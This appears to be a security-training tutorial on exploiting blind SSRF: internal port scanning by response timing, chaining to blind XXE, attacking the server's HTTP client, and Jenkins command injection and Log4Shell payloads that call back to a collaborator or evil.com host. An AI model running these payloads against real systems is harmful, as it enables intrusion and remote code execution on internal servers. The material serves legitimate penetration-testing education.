## The core problem you just identified

You found blind SSRF. Great! But now what?

- You can make the server **send requests** anywhere
- But you **can't see** what comes back
- So you can't just fetch `admin/delete?user=carlos` and know if it worked

**You need new techniques.**

---

## Technique 1: Blind internal port scanning

Even without seeing responses, you can **map the internal network** using timing or side effects.

### How it works

You inject different internal addresses and measure **how long the server takes to respond**.

| Result | What it means |
|--------|----------------|
| Fast response (< 1 sec) | Port is closed (server gave up quickly) |
| Slow response (2-5 sec) | Port is open (server tried to connect, waited, then timed out) |
| Different error message | Port might be open but service is different |

### Example payloads for scanning

```
stockApi=http://192.168.0.1:80
stockApi=http://192.168.0.1:443
stockApi=http://192.168.0.1:22
stockApi=http://192.168.0.2:8080
stockApi=http://10.0.0.1:3306
```

You send hundreds of these and log the response times. The slow ones reveal open ports.

## Technique 2: Blind vulnerability probing

You can't see responses, but you can send **payloads that trigger out-of-band interactions** on the *target* server.

### The two-stage attack

1. **Stage 1:** Your blind SSRF hits an internal server
2. **Stage 2:** That internal server is vulnerable and makes its OWN out-of-band request to you

### Example: Blind XXE on an internal server

Internal server at `http://192.168.0.50:8080/xml-parser` might be vulnerable to XXE.

Your blind SSRF payload:

```
stockApi=http://192.168.0.50:8080/xml-parser?data=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://your-collaborator.oast.site/xxe"> %xxe;]>
```

If that internal server processes your XML and makes a request to your Collaborator, you've now:
1. Confirmed the internal server exists
2. Confirmed it's vulnerable to XXE
3. Can now exploit that XXE further

## Technique 3: Attacking the server's HTTP client

This is the **most dangerous** but also the most complex.

The idea: The application server has an **HTTP client** (the thing that makes the SSRF requests). That HTTP client has its own vulnerabilities.

### Common HTTP client vulnerabilities

| Vulnerability | What it does |
|---------------|---------------|
| **Response splitting** | Inject new HTTP responses to control what the server thinks |
| **Header injection** | Add malicious headers to internal requests |
| **Request smuggling** | Confuse the server about where one request ends and another begins |
| **Buffer overflow** | Crash or take over the HTTP client |

### How you exploit these

You control the **target URL** and, in some cases, the **response** that comes back.

If you can make the server's HTTP client parse a malicious response (by pointing it to your own server), you might trigger a vulnerability in the client library itself.

**Example flow:**

1. You control `evil.com/server-status`
2. You make the victim server fetch `http://evil.com/server-status`
3. Your server returns a specially crafted HTTP response
4. The victim's HTTP client parses it and crashes (or executes your code)

## Technique 4: Blind command injection via SSRF

If the blind SSRF can reach a service that executes system commands, you might inject commands.

### Example: Internal Jenkins server

Jenkins has a script console at `/script`. If you can reach it:

```
stockApi=http://internal-jenkins:8080/script?script=Runtime.getRuntime().exec("wget http://your-collaborator.oast.site/executed")
```

You won't see the output, but if your Collaborator receives a request, you know the command ran.

## Practical checklist for blind SSRF exploitation

```
□ Phase 1: Detection
   □ Confirm SSRF exists using Collaborator/Interactsh
   
□ Phase 2: Internal network discovery
   □ Sweep common internal IP ranges (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
   □ Sweep common ports (80, 443, 8080, 8443, 22, 3306, 6379, 9200)
   □ Measure response times to identify open ports
   
□ Phase 3: Service fingerprinting
   □ Send protocol-specific probes (HTTP headers, SMTP, Redis commands)
   □ Look for out-of-band interactions from the internal service
   
□ Phase 4: Vulnerability chaining
   □ Test for blind XXE on internal XML parsers
   □ Test for blind SQL injection (using DNS exfiltration)
   □ Test for blind command injection
   □ Test for known vulnerabilities in internal services (Log4Shell, etc.)
   
□ Phase 5: Client-side attacks
   □ Set up your own HTTP server
   □ Make the victim fetch from you
   □ Try response splitting / header injection
```

## Real-world example: Chaining blind SSRF → Log4Shell

This is a famous attack chain:

1. **Blind SSRF** lets you make the server request `http://internal-logger:8080/search?q=test`
2. The internal logger runs **Log4Shell**-vulnerable Log4j
3. You inject `{jndi:ldap://your-collaborator.oast.site/exploit}` into the search parameter
4. The logger makes an LDAP request to your server
5. Your server responds with a malicious Java class
6. **Remote code execution** on the internal logger

All without ever seeing a direct response from the SSRF.

## Summary: Blind SSRF exploitation paths

| Technique | Difficulty | Impact |
|-----------|------------|--------|
| Port scanning (timing) | Easy | Low (mapping only) |
| Sending attack payloads blindly | Medium | Medium (depends on internal vulns) |
| Chaining with blind XXE/SQLi | Medium | High |
| Attacking HTTP client | Hard | Very High (RCE possible) |
| Chaining with Log4Shell | Medium | Critical (RCE) |

---

## Key takeaway

> **Blind SSRF is not a dead end. It's a gateway.**

You can't see what's inside the internal network. But you can **knock on every door** and listen for echoes. And if one of those doors is vulnerable, you can slip a payload through that calls back to you from the inside.
